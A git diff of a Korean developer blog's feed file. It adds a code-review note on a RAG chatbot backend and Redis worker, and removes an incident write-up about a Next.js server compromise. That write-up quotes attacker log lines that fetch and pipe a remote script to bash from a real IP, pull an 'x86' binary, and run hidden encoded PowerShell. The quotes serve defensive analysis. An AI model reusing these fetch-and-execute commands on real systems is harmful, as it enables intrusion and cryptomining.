@@ -1,4 +1,149 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ko"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" hreflang="ko" /><updated>2026-02-14T07:42:39+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Paul’s Archives</title><subtitle>성장하는 개발자, 소통하는 개발자, 빠른 적용을 최 우선으로 삼는 개발자. 다음을 항상 생각하며, 개발 속에서 가치를 만들어내는 것을 목표로 합니다.</subtitle><author><name>Paul2021-R</name></author><entry><title type="html">Protostar review note - 03 - FastAPI DBs</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/00-protostar-review.html" rel="alternate" type="text/html" title="Protostar review note - 03 - FastAPI DBs" /><published>2026-02-14T00:00:00+00:00</published><updated>2026-02-14T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/00-protostar-review</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/00-protostar-review.html"><![CDATA[<h2 id="coreminio_clientpy">core/minio_client.py</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ko"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" hreflang="ko" /><updated>2026-02-16T06:43:57+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Paul’s Archives</title><subtitle>성장하는 개발자, 소통하는 개발자, 빠른 적용을 최 우선으로 삼는 개발자. 다음을 항상 생각하며, 개발 속에서 가치를 만들어내는 것을 목표로 합니다.</subtitle><author><name>Paul2021-R</name></author><entry><title type="html">Protostar review note - 04 - AI</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/16/00-protostar-review-copy.html" rel="alternate" type="text/html" title="Protostar review note - 04 - AI" /><published>2026-02-16T00:00:00+00:00</published><updated>2026-02-16T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/16/00-protostar-review%20copy</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/16/00-protostar-review-copy.html"><![CDATA[<h2 id="coreaipy">core/ai.py</h2>
+<p>이 파일은 OpenAI 호환 API(OpenRouter)를 사용하여 AI 비서(Protostar)의 응답을 생성하고, RAG(Retrieval-Augmented Generation) 구성을 위한 파일 청킹(Chunking) 및 프롬프트 구성을 담당하는 핵심 모듈이다.</p>
+
+<h3 id="1-주요-개념">1. 주요 개념</h3>
+
+<ul>
+  <li><strong>RAG (Retrieval-Augmented Generation)</strong>: 언어 모델(LLM)이 답변을 생성하기 전에, 외부의 신뢰할 수 있는 데이터베이스(이력서, 블로그 글 등)에서 관련 문서를 검색하여 컨텍스트로 제공하는 기술이다. 이를 통해 할루시네이션(환각)을 줄이고 최신/개인화된 정보를 바탕으로 답변할 수 있다.</li>
+  <li><strong>Chunking (청킹)</strong>: 긴 문서를 LLM의 컨텍스트 윈도우(Context Window)에 맞게, 그리고 검색 효율성을 높이기 위해 의미 있는 작은 조각으로 나누는 과정이다.</li>
+  <li><strong>Streaming (스트리밍)</strong>: 전체 답변이 생성될 때까지 기다리지 않고, 토큰 단위로 생성되는 즉시 클라이언트에게 전송하여 체감 대기 시간을 줄이는 기술이다.</li>
+</ul>
+
+<h3 id="2-핵심-로직-흐름">2. 핵심 로직 흐름</h3>
+
+<ul>
+  <li><strong>문서 적재 및 청킹 (<code class="language-plaintext highlighter-rouge">load_and_chunk_files</code>)</strong>:
+    <ol>
+      <li>로컬 디렉토리의 Markdown(<code class="language-plaintext highlighter-rouge">.md</code>) 파일들을 읽어 들인다.</li>
+      <li>빈 줄(<code class="language-plaintext highlighter-rouge">\n\n</code>)을 기준으로 분리한다.</li>
+      <li>문단 단위의 청크(Chunk)로 나눈다.</li>
+      <li>길이가 너무 짧은 문자열은 버리고, 파일명과 문단 번호를 메타데이터처럼 문자열에 포함시켜 리스트에 저장한다.</li>
+    </ol>
+  </li>
+  <li><strong>응답 스트리밍 생성 (<code class="language-plaintext highlighter-rouge">generate_response_stream</code>)</strong>:
+    <ol>
+      <li>외부(Worker)에서 전달받은 RAG 검색 결과(<code class="language-plaintext highlighter-rouge">context</code>)와 대화 이력(<code class="language-plaintext highlighter-rouge">history</code>), 사용자 질문(<code class="language-plaintext highlighter-rouge">prompt</code>)을 조립한다.</li>
+      <li>LLM에 전달할 메시지 배열을 구성한다. 시스템 프롬프트에는 페르소나 및 엄격한 규칙(한국어 사용, 3문단 이내 등)이 정의된다.</li>
+      <li>생성된 응답은 <code class="language-plaintext highlighter-rouge">async for</code> 문을 통해 토큰(Token)이 생성될 때마다 비동기 제너레이터(<code class="language-plaintext highlighter-rouge">yield</code>)로 즉시 반환한다.</li>
+    </ol>
+  </li>
+  <li><strong>응답 요약 (<code class="language-plaintext highlighter-rouge">generate_summary</code>)</strong>:
+    <ol>
+      <li>대화를 저장한다.</li>
+      <li>별도의 작업으로 Redis 를 통해 다시 ‘수주’를 맡긴다.</li>
+      <li>수주를 받으면 새로운 Worker 가 해당 수주를 챙겨서, DB 상의 대화 원문을 읽는다.</li>
+      <li>다음 컨텍스트 활용을 위해, 생성된 긴 응답 텍스트를 다시 LLM에 통과시켜 3문장 이내의 간결한 한 문단으로 요약을 요청한다.</li>
+      <li>저장한다.</li>
+      <li>(이후) 동일 세션에서의 대화 시 이 내용이DB 상에 발견되면, 요약본과 함께 전달된다. (요약 없을 시 원본 대화 그대로 들어감)</li>
+    </ol>
+  </li>
+</ul>
+
+<h3 id="3-대체-가능한-라이브러리-및-메서드-트레이드오프">3. 대체 가능한 라이브러리 및 메서드 (트레이드오프)</h3>
+
+<ul>
+  <li><strong>텍스트 청킹(Text Chunking) 로직</strong>
+    <ul>
+      <li><strong>현재 방식</strong>: <code class="language-plaintext highlighter-rouge">content.split("\n\n")</code>을 사용하여 빈 줄(문단) 기준으로 문자열을 단순 분리한다.</li>
+      <li><strong>대체 라이브러리</strong>: <code class="language-plaintext highlighter-rouge">LangChain</code>의 <code class="language-plaintext highlighter-rouge">RecursiveCharacterTextSplitter</code> 또는 <code class="language-plaintext highlighter-rouge">LlamaIndex</code>의 문장 분리 도구.</li>
+      <li><strong>트레이드오프</strong>: 현재의 단순 분리 방식은 외부 의존성이 없고 실행 속도가 매우 빠르다는 장점(Lightweight)이 있다. 단락 내의 길이가 너무 길어질 경우 LLM의 토큰 제한을 초과할 수 있고, 문맥이 끊기는 가장자리 데이터의 손실이 발생할 수 있다. 반면 LangChain 등을 사용하면 오버랩(Overlap) 기능을 통해 문맥 단절을 방지하고 정확한 토큰 수 기반으로 분리할 수 있지만, 라이브러리 의존성이 추가되고 메모리 및 연산 오버헤드가 증가한다.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="4-구조적-취약점-및-개선-방향">4. 구조적 취약점 및 개선 방향</h3>
+
+<ul>
+  <li><strong>취약점</strong>: 전반적으로 파일 및 토큰의 섬세한 관리적 차원에서의 한계가 존재한다.
+    <ol>
+      <li>파일 로딩 시 <code class="language-plaintext highlighter-rouge">read()</code>로 전체 텍스트를 메모리에 한 번에 올리고 단순 문자열로 자르기 때문에, 파일 크기가 커지거나 구조가 복잡해지면 OOM(Out of Memory) 위험이 있다.</li>
+      <li>LLM으로 전달되는 토큰 한도에 대한 예외 처리가 부재하다.</li>
+    </ol>
+  </li>
+  <li><strong>개선 방향</strong>: 텍스트 분할 시 토큰 카운터 기반의 청크 분할 기법(예: Tiktoken 결합)을 도입하고 Chunk 간 Overlap을 두어 문맥 손실을 방지해야 한다.</li>
+</ul>
+
+<h3 id="5-핵심-메서드-및-라이브러리-함수">5. 핵심 메서드 및 라이브러리 함수</h3>
+
+<ul>
+  <li><strong><code class="language-plaintext highlighter-rouge">AsyncOpenAI</code> (openai 라이브러리)</strong>: 비동기(Asynchronous) 환경에서 OpenAI API(또는 호환되는 OpenRouter API)와 통신하기 위한 클라이언트 객체이다. FastAPI와 같은 비동기 프레임워크에서 I/O 블로킹 없이 LLM 요청을 처리하기 위해 필수적이다.
+    <ul>
+      <li>현재 사용 중인 OpenRouter 에서는 API 호환이 되서 SDK 를 OpenAI 를 사용하였다. 하지만 OpenRouter 에서 현재 OpenRouter SDK Beta가 나온 상태이고 이거에 대응할 필요가 있다.</li>
+    </ul>
+  </li>
+  <li><strong><code class="language-plaintext highlighter-rouge">client.chat.completions.create(..., stream=True)</code></strong>: LLM의 응답을 한 번에 기다리지 않고, 텍스트가 생성되는 즉시 스트리밍 형태로 받아오기 위한 핵심 메서드이다. 실시간 챗봇 체감 속도를 높이는 데 기여한다.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">textwrap.dedent</code> (내장 모듈)</strong>: Python 코드 내에서 멀티라인 문자열(Multi-line string)로 시스템 프롬프트를 작성할 때, 코드 가독성을 위해 추가된 들여쓰기 공백을 텍스트에서 깔끔하게 제거해주는 함수이다. 불필요한 공백 토큰을 줄여 LLM의 인식을 돕는다.</li>
+</ul>
+
+<h2 id="coreworkerpy">core/worker.py</h2>
+
+<p>이 파일은 Redis를 백엔드로 사용하는 비동기 작업 워커(Worker) 시스템이다. 클라이언트의 채팅 요청을 큐에서 꺼내어 처리하고, RAG 문서를 검색하여 AI 모듈에 전달한 뒤, 생성된 응답 조각을 Redis Pub/Sub을 통해 다시 전송하는 역할을 수행한다. 기본적으로 AI 를 기반으로 하는 모든 작업은 해당의 로직을 따라 진행된다.</p>
+
+<h3 id="1-주요-개념-1">1. 주요 개념</h3>
+
+<ul>
+  <li><strong>Message Queue (메시지 큐)</strong>: 요청을 즉시 처리하지 않고 큐(<code class="language-plaintext highlighter-rouge">chat:job:queue</code>)에 담아두었다가, 워커가 자신의 처리 능력(Capacity)에 맞게 순차적으로 꺼내어 처리하는 비동기 처리 패턴을 취하여, 요청하는 대상(Nestjs)과 처리자(FastAPI)를 구분하여 시스템 안정성을 향상 시키고, 수평적 스케일 아웃 호환성을 유지시킨다.</li>
+  <li><strong>Pub/Sub (발행/구독 모델)</strong>: 워커가 AI 모델로부터 스트리밍으로 전달받은 토큰(조각)을 특정 채널(<code class="language-plaintext highlighter-rouge">chat:stream:{uuid}-{session_id}</code>)에 발행(Publish)하면, 이를 구독(Subscribe)하고 있는 웹서버(NestJS 등)가 클라이언트에게 즉시 전달하는 실시간 메시징 패턴이다.</li>
+  <li><strong>Semaphore (세마포어)</strong>: <code class="language-plaintext highlighter-rouge">asyncio.Semaphore(MAX_CONCURRENT_JOBS)</code>를 활용하여 동시에 처리할 수 있는 최대 코루틴(작업)의 수를 제한하는 동시성 제어 기법이다. 이를 통해 시스템의 과도한 작업이 올라감으로써 생길 문제들을 제어한다.</li>
+</ul>
+
+<h3 id="2-핵심-로직-흐름-1">2. 핵심 로직 흐름</h3>
+
+<ul>
+  <li><strong>작업 리스닝 루프 (<code class="language-plaintext highlighter-rouge">run_worker</code>)</strong>:
+    <ol>
+      <li>무한 루프(<code class="language-plaintext highlighter-rouge">while True</code>)를 돌며 Redis의 특정 큐(<code class="language-plaintext highlighter-rouge">chat:job:queue</code>)에서 대기 중인 작업을 감시한다.</li>
+      <li>세마포어(Semaphore)를 획득하여 동시 처리량을 조절한다.</li>
+      <li>큐에 작업이 들어오면 백그라운드 태스크로 분리하여 실행을 요청한다.</li>
+    </ol>
+  </li>
+  <li><strong>단일 작업 처리 (<code class="language-plaintext highlighter-rouge">process_chat_job</code>)</strong>:
+    <ol>
+      <li>JSON 형태의 작업 데이터를 파싱한 후</li>
+      <li><code class="language-plaintext highlighter-rouge">general</code> 모드일 경우 RAG 문서 검색을 수행하여 컨텍스트를 구성한다. (그렇지 않은 경우는 블로그의 글을 요약하는 등의 특수 목적이므로, 이에 따른 로직에 들어간다.)</li>
+      <li>DB에 사용자 질문을 기록하고 과거 대화 이력을 조회한다.
+        <ul>
+          <li>별도의 워커가 대화를 요약해서 저장해둔다. 요약한 내용이 있을 시 이를 가져가고, 요약이 없다면 원본 대화 내용 일부를 전달한다.</li>
+        </ul>
+      </li>
+      <li><code class="language-plaintext highlighter-rouge">generate_response_stream</code>을 호출한다.</li>
+    </ol>
+  </li>
+  <li><strong>실시간 스트리밍 및 후처리</strong>:
+    <ol>
+      <li>AI가 생성한 응답 조각(Token)을 하나씩 받을 때마다, 즉시 Redis의 Pub/Sub 채널(<code class="language-plaintext highlighter-rouge">chat:stream:{uuid}-{sessionId}</code>)로 발행(<code class="language-plaintext highlighter-rouge">publish</code>)하여 클라이언트(NestJS 등)로 데이터를 전송한다.</li>
+      <li>완료 시 <code class="language-plaintext highlighter-rouge">done</code> 신호를 전송하고, 최종 조립된 전체 텍스트를 DB에 저장한 후 요약 작업을 위한 큐로 메시지 ID를 밀어 넣는다(<code class="language-plaintext highlighter-rouge">rpush</code>). (새롭게 만든 답변에 대한 요약)</li>
+    </ol>
+  </li>
+</ul>
+
+<h3 id="3-대체-가능한-라이브러리-및-메서드-트레이드오프-1">3. 대체 가능한 라이브러리 및 메서드 (트레이드오프)</h3>
+
+<ul>
+  <li><strong>작업 큐 및 워커 루프</strong>
+    <ul>
+      <li><strong>현재 방식</strong>: Redis의 <code class="language-plaintext highlighter-rouge">brpop</code> 명령어를 무한 루프(<code class="language-plaintext highlighter-rouge">while True</code>)로 직접 폴링(Polling)하며 <code class="language-plaintext highlighter-rouge">asyncio.create_task</code>로 작업을 실행한다.</li>
+      <li><strong>대체 라이브러리</strong>: <code class="language-plaintext highlighter-rouge">Celery</code>, <code class="language-plaintext highlighter-rouge">ARQ</code> (Asyncio Redis Queue), <code class="language-plaintext highlighter-rouge">RQ</code> 등 전문 Task Queue 프레임워크.</li>
+      <li><strong>트레이드오프</strong>: 현재의 커스텀 루프 방식은 설정이 직관적이고 코드가 가벼워 추가적인 데몬이나 프레임워크 학습이 필요 없다는 장점이 있다. 그러나, 워커 프로세스가 갑자기 종료될 경우 현재 처리 중이던 데이터를 복구할 수 있는 기능(Message ACK)이 기본적으로 없으며, 재시도(Retry) 로직이나 스케줄링을 직접 구현해야 하는 단점이 있다. Celery나 ARQ를 사용하면 이러한 안정성(Reliability) 기능이 보장되지만, 아키텍처가 무거워지고 설정이 복잡해진다.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="4-구조적-취약점-및-개선-방향-1">4. 구조적 취약점 및 개선 방향</h3>
+
+<ul>
+  <li><strong>취약점</strong>: <code class="language-plaintext highlighter-rouge">brpop</code>으로 큐에서 데이터를 꺼낸 직후(Pop) 워커가 크래시(다운)되면, 해당 작업은 완료되지 않은 상태로 영구적으로 유실(Data Loss)되며, Redis Pub/Sub 특성상 발행 시점에 구독자가 없으면 스트리밍 데이터 역시 유실된다.</li>
+  <li><strong>개선 방향</strong>: 작업 유실 방지를 위해 단순 List 기반의 큐 대신 Redis Streams 기반의 큐 연산(XREADGROUP)을 도입하거나 비동기 큐 전문 라이브러리(ARQ 등)로 마이그레이션 해야 한다. (자세한 내용이 필요하면 요청 바람)</li>
+</ul>
+
+<h3 id="5-핵심-메서드-및-라이브러리-함수-1">5. 핵심 메서드 및 라이브러리 함수</h3>
+
+<ul>
+  <li><strong><code class="language-plaintext highlighter-rouge">redis_client.brpop("chat:job:queue", timeout=5)</code></strong>: 지정된 큐(List 자료구조)에 데이터가 들어올 때까지 대기(Block)하다가, 데이터가 들어오면 꺼내오는(Pop) Redis 명령어이다. CPU를 점유하는 무한 폴링(Polling) 방식보다 시스템 자원을 효율적으로 사용한다.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">redis_client.publish(channel, message)</code></strong>: Redis의 Pub/Sub 메커니즘을 사용하여 지정된 채널을 구독 중인 모든 클라이언트에게 비동기적으로 메시지를 전송한다. 이를 통해 스트리밍 데이터 조각을 타 서비스로 즉각 브로드캐스트할 수 있다.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">asyncio.Semaphore</code></strong>: 동시에 실행될 수 있는 코루틴(작업)의 최대 개수(예: <code class="language-plaintext highlighter-rouge">MAX_CONCURRENT_JOBS = 100</code>)를 제한하는 동기화 객체이다. 외부 API Rate Limit이나 DB 커넥션 풀의 한도를 초과하지 않도록 보호하는 역할을 한다.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">asyncio.create_task</code></strong>: 이벤트 루프에 코루틴 실행을 예약하여 블로킹 없이 백그라운드에서 비동기 작업을 병행(Concurrent) 처리하게 하는 내장 함수이다. <code class="language-plaintext highlighter-rouge">run_worker</code> 루프가 각 Job을 넘기고 즉시 다음 Job을 대기할 수 있게 만든다.</li>
+</ul>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><category term="Protostar" /><category term="Project" /><category term="Review" /><category term="FastAPI" /><summary type="html"><![CDATA[core/ai.py 이 파일은 OpenAI 호환 API(OpenRouter)를 사용하여 AI 비서(Protostar)의 응답을 생성하고, RAG(Retrieval-Augmented Generation) 구성을 위한 파일 청킹(Chunking) 및 프롬프트 구성을 담당하는 핵심 모듈이다.]]></summary></entry><entry><title type="html">Protostar review note - 03 - FastAPI DBs</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/00-protostar-review.html" rel="alternate" type="text/html" title="Protostar review note - 03 - FastAPI DBs" /><published>2026-02-14T00:00:00+00:00</published><updated>2026-02-14T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/00-protostar-review</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/00-protostar-review.html"><![CDATA[<h2 id="coreminio_clientpy">core/minio_client.py</h2>
 
 <p>이 모듈은 MinIO 오브젝트 스토리지와의 연결을 관리하고 파일을 다운로드하는 래퍼(Wrapper) 클래스를 정의하고 있다.</p>
 
@@ -2182,119 +2327,4 @@
 
 <p>턱 밑까지 숨이 차오를 수 있도록, 그리하여 달리다가 서서히 아픔이 사라지고, 끈덕지게 문제를 해어 나가는 과정에서 새로운 지평선이 보일 수 있도록.</p>
 
-<p>노력해야겠다.</p>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><summary type="html"><![CDATA[들어가면서]]></summary></entry><entry><title type="html">TIL - 내 컴퓨터가 채굴기가 될 뻔했….지만 해결기</title><link href="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack.html" rel="alternate" type="text/html" title="TIL - 내 컴퓨터가 채굴기가 될 뻔했….지만 해결기" /><published>2025-12-09T00:00:00+00:00</published><updated>2025-12-09T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack</id><content type="html" xml:base="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack.html"><![CDATA[<h2 id="내-컴퓨터가-채굴기가-될-뻔했지만-해결기">내 컴퓨터가 채굴기가 될 뻔했….지만 해결기</h2>
-
-<p><img src="/assets/images/posts/2025-12/20251209-020.png" alt="" /></p>
-
-<p>개인 프로젝트를 진행하다가 갑자기 프론트엔드 서버가 동작하지 않는 것을 발견하였다. 백엔드 서버도 문제없이 돌아가고 있었고, 이미 기존에 충분히 안정성을 검증했던 거라, 갑자기 안된다는 것에 이상함을 감지하고 Grafana와 Docker logs 를 뒤져보기 시작했다. 그런데…</p>
-
-<p><img src="/assets/images/posts/2025-12/20251209-013.png" alt="" /></p>
-<blockquote>
-  <p>응….? 800%?</p>
-</blockquote>
-
-<p><img src="/assets/images/posts/2025-12/20251209-014.png" alt="" /></p>
-<blockquote>
-  <p>엥?</p>
-</blockquote>
-
-<p><img src="/assets/images/posts/2025-12/20251209-015.png" alt="" /></p>
-<blockquote>
-  <p>에에엥?</p>
-</blockquote>
-
-<p><img src="/assets/images/posts/2025-12/20251209-016.png" alt="" /></p>
-<blockquote>
-  <p>컨테이너를 다시 켜면서 로그는 여기까지…</p>
-</blockquote>
-
-<p>뭔가 쎄한 감정이 드는 순간, 여기저기서 오는 메일, 알림. 털렸다는 소식이 들려오기에 우선 제일 먼저 로그부터 까보기로 했다. 그러자 몇 가지 단적인 문제 포인트들을 찾을 수 있었다.</p>
-
-<h3 id="로그-분석-결과-해킹-시도-증거">로그 분석 결과: 해킹 시도 증거</h3>
-
-<p>로그 곳곳에 공격자가 서버를 장악하고 악성 스크립트를 실행하려 한 흔적이 있었다.</p>
-
-<ul>
-  <li><strong>외부 IP 연결 시도:</strong>
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">Connecting to 193.34.213.150</code></li>
-      <li><code class="language-plaintext highlighter-rouge">curl http://45.134.174.235:443/2.sh | bash</code></li>
-      <li>이 IP들은 공격자가 악성 파일을 호스팅하는 C&amp;C(Command &amp; Control) 서버인지는 알 수 없지만, 확실한건 수십차례, 수시간 동안 계속 연결을 시도했다.</li>
-    </ul>
-  </li>
-  <li><strong>악성 파일 다운로드 및 실행 시도:</strong>
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">wget: can't open 'x86': File exists</code>:  <code class="language-plaintext highlighter-rouge">x86</code>이라는 파일을 다운로드하려 했다.</li>
-      <li><code class="language-plaintext highlighter-rouge">/dev/health.sh</code>: 일반적인 Next.js 컨테이너에는 존재하지 않는 경로의 쉘 스크립트, 아마도 health 로 볼 때, 다른 보안 프로그램 등에서 문제 없다고 넘어갈 수있게 만드려는 도구가 아닐가 추정된다.</li>
-    </ul>
-  </li>
-  <li><strong>공격 페이로드 (Payload):</strong>
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">powershell -nop -w hidden -enc ...</code>: Base64로 인코딩된 파워쉘 명령어를 실행하려 했다.</li>
-      <li><code class="language-plaintext highlighter-rouge">wow i guess im finna bridge now... MEOWWW...</code>: 스크립트 키디(Script Kiddie)나 특정 봇넷이 남기는 시그니처 메시지입니다.</li>
-    </ul>
-  </li>
-</ul>
-
-<p>CPU 사용량 800% 를 찍었고, 서버가 뻗을 뻔 했지만 살아는 있었다. 그렇기에 얼른 컨테이너 이미지와 볼륨을 새로 정리한 뒤, 우선 해결책으로 방법을 찾아 다녔다.</p>
-
-<h3 id="해결-다행이-빠르게-해결-된다-하지만-주의사항">해결: 다행이 빠르게 해결 된다. 하지만 주의사항</h3>
-
-<p><img src="/assets/images/posts/2025-12/20251209-017.png" alt="" /></p>
-
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npx fix-react2shell-next
-</code></pre></div></div>
-
-<p>다행이 사용하는 기술 스택이 next 였기도 하고, next 역시 빠르게 대응 빌드를 올리게 되면서, 해당 명령어만 치면 문제는 해결 된다고 했다.
-하지만 이렇게 될 경우 문제가 있는데 그것은 바로 호환성 관련된 영역이다.</p>
-
-<p><img src="/assets/images/posts/2025-12/20251209-018.png" alt="" /></p>
-
-<p>빌드 및 자동배포가 터졌고 로그를 확인해 보았다. 왜 그런가 알아보니, next 기반인  react 와 eslint 는 next에 대응되는 버전이 필요하였고, 버전이 안 맞으면 빌드 시 터지는 것이었다. 하물며 어이없게도 next 공식 보안 패치 명령어는 이러한 문제를 해결해주지 않는 것을 (…) 알게 되었다.</p>
-
-<p>프론트엔드 개발자는 아니기 때문에 내가 몰라서 그랬던 건지는 모르겠지만, 이렇게 package.json 의 버전을 바꿔주면 비로소 해결 되는 것을 알 수 있었다.</p>
-
-<h3 id="흠-근데-희한하네-왜-괜찮았지">흠 근데 희한하네… 왜 괜찮았지?</h3>
-
-<p>그리하여 정리하고 배포를 다시 안전하게 하고, 하는 김에 Jenkins 잡까지 다듬어서, 정리를 했는데 왜 이런 일이 터졌고, CPU 사용량 800% 로 뚫은 것도 사실인데, 반대로 로그를 뒤져본 결과 공격이 실패했고, 동시에 왜 다른 서버는 쌩쌩하게 살아있던거지? 라는 생각이 들어 로그와 내용을 좀 분석 해볼 필요가 있다고 느꼈다.</p>
-
-<h4 id="무엇이-문제를-키웠나">무엇이 문제를 키웠나?</h4>
-
-<ul>
-  <li><strong>취약점은 답이 없다</strong> : 근본적으론 보안 구멍이 발생한 것 자체가 문제기는 했다. 종단간 암호화에 프록시 까지 잘 앞에 세워뒀었고, 그정도면 어지간하면 문제가 없어야 하는데 당장에 구멍이 뚫려있으니… nextjs 자체가 쉘로 동작하고 명령어를 실행시키는 것은 정말 충격적이었다.</li>
-  <li><strong>Rate Limiter &amp; WAF 의 부재</strong> :
-    <ul>
-      <li>내 핵심 문제 사항이라고 볼 수 있는데… 개발과정에 있다보니 해당 보안 처리를 아직 설정을 안한 상태였다.</li>
-      <li>로그를 디테일하게 파보니 Next.js 의 취약점을 이용해 L7 레이어 공격이라 네트워크 방화벽 L3/L4 를 우회했고, 이 와중에  <code class="language-plaintext highlighter-rouge">child_process.exec()</code> 이나 <code class="language-plaintext highlighter-rouge">spawn()</code> 을 호출한 것으로 보였다.</li>
-      <li>그리고 <code class="language-plaintext highlighter-rouge">wget: can't open 'x86x: File exists</code> 라는 메시지도 있었는데 이는 ‘이미 파일이 있다’는 에러이고 이런 점에서 감안하면 다음과 같은 상황으로 추론이 되었다.
-        <ol>
-          <li>첫번째 다운로드 성공한게 아닌가 싶다.</li>
-          <li>하지만 성공한 프로그램이 제대로 구동 안됨</li>
-          <li>계속 다운로드 시도 및 프로세스 생성 -&gt; 프로세스가 계속 발생하면서 처리가 필요했고 그 과정에서 800% 이용률 발생</li>
-          <li>하지만 시도한 방법 자체가 대단히 심플한 명령어 수행 요청이었고, 좀비 스레드가 생성될 순 있겠지만 그것이 시스템의 제어를 망가뜨릴 정도까지는 가지 못했다- 는 점을 알 수 있었다.</li>
-        </ol>
-      </li>
-      <li>따라서, 결과적으로 Rate Limiter 와 WAF 를 통해 지능적으로 문제 시 될 요청을 제한했다면 아주 완벽한 보안이 되지 않을까 한다.</li>
-    </ul>
-  </li>
-</ul>
-
-<h4 id="그런데도-불구하고-털리지-않은-점은">그런데도 불구하고 털리지 않은 점은?</h4>
-
-<ul>
-  <li>그럼에도 신기하게 서버 통으로 문제가 발생하진 않았었다. 이유는 무엇인가?</li>
-</ul>
-
-<ol>
-  <li><strong>플랫폼 차이</strong> : 로그를 보니 <code class="language-plaintext highlighter-rouge">powershell -nop -w hidden -enc ...</code> 이런 로그가 눈에 들어왔는데, 즉, 공격자는 윈도우 서버를 공격할 목적이 다분해 보였다. 아마도 시스템 권한이나, 자원 사용에 있어서 윈도우즈 보안이 뚤릴 것을 노린게 아닌가 싶은데… 애석하게도 리눅스 시스템으로 가능한 보안적으로 든든한 Ubuntu LTS 버전, 보안패치를 짱짱하게 받은 상황이니 다행이라고 볼 수 있겠다.</li>
-  <li><strong>경량형 이미지와 온전한 컨테이닝</strong> : 로그 중에 <code class="language-plaintext highlighter-rouge">/bin/sh: curl: not found</code>, <code class="language-plaintext highlighter-rouge">/bin/sh: bash: not found</code> 이런게 보였다. 여기서 나름 뿌듯함을 느꼈다. 개발 하는 시점부터 써야 하는 이미지는 리소스를 최대한 줄이며, 완벽하게 하나의 역할에 맞춰 설계를 하는게 낫다- 고 생각했는데 이번 사건이 그 아주 좋은 경험이었다. 다른 작업을 하는데 필요한 도구들에 접근 자체가 불가능했고, 권한이 없는 상태에서 할 수 있는 최선의 시작점이 실행이 안되니 입구 앞에서 아무것도 할 수 없었던 것이다. 이러한 전략을 <code class="language-plaintext highlighter-rouge">공격 표면 축소(Attack Surface)</code> 라는 방법론이라고 한다는데</li>
-</ol>
-
-<p>이렇듯, 의도치 않게 1 스트라이크, 1 아웃을 경험하였고, 다행이 도구들이 준비되고, 무중단 배포나 모니터링이 얼추 되어 있다보니 다행이 문제를 해결할 수 있었다. 그리고 동시에 전에 사수가 이야기 했던 공격에 대한걸 떠올리면서, 역시 라이브 서비스는 기본 타협없이 반드시 지켜야 할 것들을 지켜 놓는게, 신상에 이롭다는 사실을 이해할 수 있었다.</p>
-
-<p>동시에 당초 목표로 AWS 호환 되도록 인프라를 설계 했었고, 만약 클라우드(AWS, Azure 등)의 오토스케일링 환경이나 종량제 과금 모델을 쓰고 있었다면, 이번 CPU 800% 폭주로 인해 이번 달 서버 비용으로 컴퓨터 한대 해먹지 않았을까? (…) 여러 모로 교훈이 되는 경험을 하지 않았나 싶다. 그리고 동시에 얼마나 털기 쉬우면 윈도우로 채굴 같은걸 하려고 했는지는 모르겠지만… 서버로 윈도우를 쓰는 건 자제하자는 나름의 교훈(?) 도 하나 얻어 가는 것 같다.</p>
-
-<p>요 최근 쿠팡도 그렇고, 통신사들도 그렇고, 보안 신경… 정말 스스로 조심하는 것도 중요하고, 무엇보다 회사에서 사고치지 않도록 이부분은 타협하지 말아야 한다는 점.. 명심해야겠다. (라는 생각에 따라 오늘 작업은 우선 nginx 앞에 SafeLine 이라는 WAF 를 하나 세워 둬야겠다…)</p>
-
-<p><img src="/assets/images/posts/2025-12/20251209-019.png" alt="" />
